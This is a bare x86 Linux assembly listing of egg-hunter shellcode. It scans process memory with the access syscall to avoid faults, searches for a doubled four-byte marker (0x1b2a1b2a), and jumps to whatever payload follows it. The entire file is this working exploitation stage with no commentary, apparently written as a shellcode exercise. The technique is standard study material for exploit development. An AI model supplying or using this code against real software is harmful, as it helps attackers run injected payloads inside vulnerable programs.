global _start
section .text
    _start:

     prep:
        xor edx, edx
	xor ecx, ecx
        cld

     pageloop:
        or dx, 0xfff

     mainloop:
        inc edx
        lea ebx, [edx+0x4]
        push 0x21
        pop eax
        int 0x80
        cmp al, 0xf2
        je pageloop
        mov eax, 0x1b2a1b2a
        mov edi, edx
        scasd
        jne mainloop
        scasd
        jne mainloop
        jmp edi